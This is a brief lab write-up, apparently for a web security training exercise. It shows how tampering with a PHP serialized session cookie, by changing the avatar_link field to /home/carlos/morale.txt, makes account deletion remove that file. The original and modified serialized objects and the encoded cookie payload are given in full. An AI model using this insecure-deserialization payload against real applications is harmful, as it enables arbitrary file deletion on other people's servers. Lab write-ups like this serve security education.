PHP Fatal error:  Uncaught Exception: Error in file upload: 4 in /home/carlos/avatar_upload.php:6

---------------------------

From this error thrown by uploading the avatar before even loading any file, we can see how the script for avatars upload is carlos' home directory, the same one where the "morale.txt" file should be contained

By tampering the decoded session cookie (i.e., the account's object serialization)
  FROM:
    O:4:"User":3:
    {s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"hzujze47d8wlzolwc9vsz7z6b8hr3dny";s:11:"avatar_link";s:18:"users/gregg/avatar";}

  TO:
    O:4:"User":3:
    {s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"hzujze47d8wlzolwc9vsz7z6b8hr3dny";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

  Which, after Base64 and URL Encoding looks like this:
    Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Imh6dWp6ZTQ3ZDh3bHpvbHdjOXZzejd6NmI4aHIzZG55IjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30%3D

And by deleting the account, we successfully delete the morale.txt from carlos' directory, thereby solving the lab.
